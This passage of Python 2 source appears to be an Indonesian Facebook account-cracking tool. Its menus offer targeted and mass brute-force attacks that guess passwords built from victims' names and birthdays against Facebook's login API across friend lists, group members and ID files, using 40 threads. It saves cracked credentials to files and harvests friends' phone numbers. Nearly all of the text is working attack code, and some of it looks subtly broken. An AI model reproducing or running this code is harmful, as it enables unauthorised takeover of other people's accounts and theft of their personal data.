        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMendapatkan semua number teman dari teman \x1b[1;97m...')
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        bz = open('out/no_teman_from_teman.txt', 'w')
        for i in a['data']:
            x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            
            try:
                hpfromteman.append(z['mobile_phone'])
                bz.write(z['mobile_phone'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(hpfromteman)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + z['mobile_phone'] + ' | ' + z['name'] + '\n',
                sys.stdout.flush()
                time.sleep(0.0001)
            continue
            except KeyError:
                continue
            

        
        bz.close()
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        print '\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mSelesai memdapatkan number \x1b[1;97m....'
        print '\r\x1b[1;91m[+] \x1b[1;92mTotal Number \x1b[1;91m: \x1b[1;97m%s' % len(hpfromteman)
        done = raw_input('\r\x1b[1;91m[+] \x1b[1;92mSave file diluar folder nama\x1b[1;91m :\x1b[1;97m ')
        os.rename('out/no_teman_from_teman.txt', 'out/' + done)
        print '\r\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m: \x1b[1;97mout/' + done
        raw_input('\n\x1b[1;91m[ \x1b[1;97maKeluar \x1b[1;91m]')
        dump()
    except IOError:
        print '\x1b[1;91m[!] Terjadi kesalahan saat membuat file'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m[!] Berhenti'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
        keluar()



def menu_hack():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;92m{\x1b[1;94m01\x1b[1;92m}\x1b[1;93m Mini Hack Facebook(\x1b[1;92mTarget\x1b[1;97m)'
    print '\x1b[1;92m{\x1b[1;94m02\x1b[1;92m}\x1b[1;93m Multi Bruteforce Facebook'
    print '\x1b[1;92m{\x1b[1;94m03\x1b[1;92m}\x1b[1;93m Super Multi Bruteforce Facebook'
    print '\x1b[1;92m{\x1b[1;94m04\x1b[1;92m}\x1b[1;93m BruteForce(\x1b[1;92mTarget\x1b[1;97m)'
    print '\x1b[1;92m{\x1b[1;94m05\x1b[1;92m}\x1b[1;93m Yahoo Checker'
    print '\x1b[1;92m{\x1b[1;94m00\x1b[1;92m}\x1b[1;91m Keluar'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    hack_pilih()


def hack_pilih():
    hack = raw_input('\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m>>> \x1b[1;97m')
    if hack == '':
        print '\x1b[1;91m[!] Salah pilih yang bener'
        hack_pilih()
    elif hack == '1':
        mini()
    elif hack == '2':
        crack()
        hasil()
    elif hack == '3':
        super()
    elif hack == '4':
        brute()
    elif hack == '5':
        menu_yahoo()
    elif hack == '0':
        menu()
    else:
        print '\x1b[1;91m[!]Salah pilih yang bener'
        hack_pilih()


def mini():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;97m[\x1b[1;91mINFO\x1b[1;97m] \x1b[1;91mAkun target harus berteman\n    dengan akunmu dulu!'
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    
    try:
        id = raw_input('\x1b[1;91m[+] \x1b[1;92mTarget ID \x1b[1;91m:\x1b[1;97m ')
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mloading\x1b[1;97m...')
        r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        a = json.loads(r.text)
        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama\x1b[1;97m : ' + a['name']
        jalan('\x1b[1;91m[+] \x1b[1;92mCheck \x1b[1;97m...')
        time.sleep(2)
        jalan('\x1b[1;91m[+] \x1b[1;92mOpen password \x1b[1;97m...')
        time.sleep(2)
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        pz1 = a['first_name'] + '123'
        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
        y = json.load(data)
        if 'access_token' in y:
            print '\x1b[1;91m[+] \x1b[1;92mFound'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
            menu_hack()
        elif 'www.facebook.com' in y['error_msg']:
            print '\x1b[1;91m[+] \x1b[1;92mFound'
            print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_hack()
        else:
            pz2 = a['first_name'] + '12345'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            y = json.load(data)
            if 'access_token' in y:
                print '\x1b[1;91m[+] \x1b[1;92mFound'
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                menu_hack()
            elif 'www.facebook.com' in y['error_msg']:
                print '\x1b[1;91m[+] \x1b[1;92mFound'
                print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                menu_hack()
            else:
                pz3 = a['last_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                y = json.load(data)
                if 'access_token' in y:
                    print '\x1b[1;91m[+] \x1b[1;92mFound'
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                    menu_hack()
                elif 'www.facebook.com' in y['error_msg']:
                    print '\x1b[1;91m[+] \x1b[1;92mFound'
                    print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                    menu_hack()
                else:
                    lahir = a['birthday']
                    pz4 = lahir.replace('/', '')
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    y = json.load(data)
                    if 'access_token' in y:
                        print '\x1b[1;91m[+] \x1b[1;92mFound'
                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                        menu_hack()
                    elif 'www.facebook.com' in y['error_msg']:
                        print '\x1b[1;91m[+] \x1b[1;92mFound'
                        print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                        menu_hack()
                    else:
                        lahirs = a['birthday']
                        gaz = lahirs.replace('/', '')
                        pz5 = a['first_name'] + gaz
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        y = json.load(data)
                        if 'access_token' in y:
                            print '\x1b[1;91m[+] \x1b[1;92mFound'
                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz5
                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                            menu_hack()
                        elif 'www.facebook.com' in y['error_msg']:
                            print '\x1b[1;91m[+] \x1b[1;92mFound'
                            print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz5
                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                            menu_hack()
                        else:
                            pz6 = 'bintang123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            y = json.load(data)
                            if 'access_token' in y:
                                print '\x1b[1;91m[+] \x1b[1;92mFound'
                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz6
                                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                menu_hack()
                            elif 'www.facebook.com' in y['error_msg']:
                                print '\x1b[1;91m[+] \x1b[1;92mFound'
                                print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz6
                                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                menu_hack()
                            else:
                                pz7 = 'sayang123, sayang, bintang, bajingan, someone, anjing, pukimak, playboy, doraemon, bahagia'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                y = json.load(data)
                                if 'access_token' in y:
                                    print '\x1b[1;91m[+] \x1b[1;92mFound'
                                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz7
                                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                    menu_hack()
                                elif 'www.facebook.com' in y['error_msg']:
                                    print '\x1b[1;91m[+] \x1b[1;92mFound'
                                    print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
                                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz6
                                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                    menu_hack()
                                else:
                                    print '\x1b[1;91m[!] Maaf sepertinya akun target tidak ada :('
                                    print '\x1b[1;91m[!] Cobs pakai tools lain.'
                                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                    menu_hack()
    except KeyError:
        print '\x1b[1;91m[!] Terget tidak ada'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        os.system('python2 mbf.py')
    



def crack():
    global idlist, passw, file
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
    passw = raw_input('\x1b[1;91m[+] \x1b[1;92mPassword \x1b[1;91m: \x1b[1;97m')
    
    try:
        file = open(idlist, 'r')
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
        for x in range(40):
            zedd = threading.Thread(target = scrak, args = ())
            zedd.start()
            threads.append(zedd)
        
        for zedd in threads:
            zedd.join()
    except IOError:
        print '\x1b[1;91m[!] File tidak ada'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        menu_hack()



def scrak():
    global up, back
    
    try:
        os.mkdir('out')
    except OSError:
        pass

    
    try:
        buka = open(idlist, 'r')
        up = buka.read().split()
        while file:
            username = file.readline().strip()
            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            data = urllib.urlopen(url)
            mpsh = json.load(data)
            if back == len(up):
                break
            if 'access_token' in mpsh:
                bisa = open('out/mbf_ok.txt', 'w')
                bisa.write(username + '|' + passw + '\n')
                bisa.close()
                x = requests.get('https://graph.facebook.com/' + username + '?access_token=' + mpsh['access_token'])
                z = json.loads(x.text)
                berhasil.append('\x1b[1;97m[ \x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m ] ' + username + '|' + passw + ' =>' + z['name'])
            elif 'www.facebook.com' in mpsh['error_msg']:
                cek = open('out/mbf_cp.txt', 'w')
                cek.write(username + '|' + passw + '\n')
                cek.close()
                cekpoint.append('\x1b[1;97m[ \x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m ] ' + username + '|' + passw)
            else:
                gagal.append(username)
                back += 1
            sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack    \x1b[1;91m:\x1b[1;97m ' + str(back) + ' \x1b[1;96m>\x1b[1;97m ' + str(len(up)) + ' =>\x1b[1;92mLive\x1b[1;91m:\x1b[1;96m' + str(len(berhasil)) + ' \x1b[1;97m=>\x1b[1;93mCheck\x1b[1;91m:\x1b[1;96m' + str(len(cekpoint)))
            sys.stdout.flush()
    except IOError:
        print '\n\x1b[1;91m[!] Sleep'
        time.sleep(0.01)
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'



def hasil():
    print 
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    for b in berhasil:
        print b
    
    for c in cekpoint:
        print c
    
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[31m[x] Failed \x1b[1;97m--> ' + str(len(gagal))
    keluar()


def super():
    global toket
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;94m01\x1b[1;97m}\x1b[1;96m Crack dengan daftar teman'
    print '\x1b[1;97m{\x1b[1;94m02\x1b[1;97m}\x1b[1;96m Crack dari teman'
    print '\x1b[1;97m{\x1b[1;94m03\x1b[1;97m}\x1b[1;96m Crack dari member group'
    print '\x1b[1;97m{\x1b[1;94m04\x1b[1;97m}\x1b[1;96m Crack dari File'
    print '\x1b[1;97m{\x1b[1;94m00\x1b[1;97m}\x1b[1;91m Keluar'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    pilih_super()


def pilih_super():
    peak = raw_input('\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m>>> \x1b[1;97m')
    if peak == '':
        print '\x1b[1;91m[! Salah pilih yang benar'
        pilih_super()
    elif peak == '1':
        os.system('clear')
        print logo
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mDapatkan semua id teman \x1b[1;97m...')
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])
        
    elif peak == '2':
        os.system('clear')
        print logo
        idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID teman \x1b[1;91m: \x1b[1;97m')
        
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;91m :\x1b[1;97m ' + op['name']
        except KeyError:
            print '\x1b[1;91m[!] Id teman tidak ada'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
            super()

        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMendapatkan semua ID teman \x1b[1;97m...')
        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
        
    elif peak == '3':
        os.system('clear')
        print logo
        idg = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID group \x1b[1;91m:\x1b[1;97m ')
        
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
            asw = json.loads(r.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom group \x1b[1;91m:\x1b[1;97m ' + asw['name']
        except KeyError:
            print '\x1b[1;91m[!] ID Group tidak ada'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
            super()

        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMendaptkan id member group \x1b[1;97m...')
        re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=9999999999999&access_token=' + toket)
        s = json.loads(re.text)
        for p in s['data']:
            id.append(p['id'])
        
    elif peak == '4':
        os.system('clear')
        print logo
        
        try:
            idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except KeyError:
            print '\x1b[1;91m[!] File tidak ada'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
            super()
        

    if peak == '0':
        menu_hack()
    else:
        print '\x1b[1;91m[!] Salah pilih yang benar'
        pilih_super()
    print '\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
    titik = [
        '.   ',
        '..  ',
        '... ']
    for o in titik:
        print '\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)
    
    print 
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    
    def main(arg):
        user = arg
        
        try:
            os.mkdir('out')
        except OSError:
            pass

        
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                z = json.loads(x.text)
                print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass1 + ' =>' + z['name']
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                cek = open('out/super_cp.txt', 'a')
                cek.write(user + '|' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                    z = json.loads(x.text)
                    print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass2 + ' =>' + z['name']
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    cek = open('out/super_cp.txt', 'a')
                    cek.write(user + '|' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['last_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                        z = json.loads(x.text)
